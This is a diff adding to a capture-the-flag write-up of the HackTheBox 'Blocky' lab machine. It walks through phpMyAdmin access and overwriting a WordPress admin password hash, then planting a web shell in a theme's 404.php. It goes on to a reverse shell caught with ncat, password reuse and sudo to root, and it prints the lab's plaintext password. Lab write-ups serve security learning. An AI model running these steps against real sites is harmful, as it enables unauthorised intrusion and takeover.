@@ -2,8 +2,6 @@
 
 first enumeration with nmap
 
-![[Pasted image 20230602000453.png]]first enumeration with nmap 
-
 ```
 # Nmap 7.93 scan initiated Thu Jun  1 23:35:37 2023 as: nmap -sC -sV -T4 -oN normal.txt -p 21,80,22,8192,25565 -Pn 10.10.10.37
 Nmap scan report for blocky.htb (10.10.10.37)
@@ -130,3 +128,76 @@ navigate to the `phpmyadmin` dir, got redirected a login page. let's use the cre
 ![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/72e55567-7805-47b1-900a-2c449f966bd8)
 
 Bull's eye we got in the phpmyadmin.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/906063bf-8b00-4348-b88f-1f865fe77c87)
+
+clicking on the wordpress db and navigating to `wp_users` table. we can see the password hash of the wp_user `Notch`. let's change the password hash. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d6db081f-11ed-44bc-8515-4311bf26301b)
+
+changed the password hash to an md5 hash which is `admin` as the password. now let's go to wp_admin.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/78d0f2d9-ede8-463c-b395-1ee0ca64bb22)
+
+login with creds `Notch:admin`.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/975c6699-10a7-4093-bec1-a915d14c0c93)
+
+Bingo, we are in, let's upload a shell.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/07f0a91d-a41f-47af-b9aa-72d859647b57)
+
+navigate to the appearance, theme editor button and edit the `404.php` file in the theme. now let's locate the shell.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/e447cec5-8a25-43c1-b335-8e7dff4f1ffe)
+
+locate the shell in the path `http://blocky.htb/wp-content/themes/twentyseventeen/404.php?cmd=id` and we got an RCE. let's spawn a reverse shell.
+
+```
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Blocky]
+└─$ ncat -lnvp 1337
+Ncat: Version 7.93 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.10.10.37.
+Ncat: Connection from 10.10.10.37:37032.
+bash: cannot set terminal process group (1466): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@Blocky:/var/www/html/wp-content/themes/twentyseventeen$ id 
+id 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@Blocky:/var/www/html/wp-content/themes/twentyseventeen$ 
+```
+Bingo we got a reverse shell.
+
+
+## Privilege Escalation
+
+```
+www-data@Blocky:/home/notch$ su notch
+Password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+notch@Blocky:~$
+```
+switching user to notch using the password got ealier for phpmyadmin, `8YsqfCTnvxAUeduzjNSXe22` boom it worked.
+
+```
+notch@Blocky:~$ sudo -l
+[sudo] password for notch: 
+Matching Defaults entries for notch on Blocky:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User notch may run the following commands on Blocky:
+    (ALL : ALL) ALL
+notch@Blocky:~$ sudo su
+root@Blocky:/home/notch# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Blocky:/home/notch# 
+```
+checking for sudo privs, we can see we are allowed to run sudo commands without specifying password. so `sudo su` got us a root shell.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/b12d8e15-805b-4096-a42c-07a950b9fc6f)
+
+and we are through... 😜 had fun yeah ?
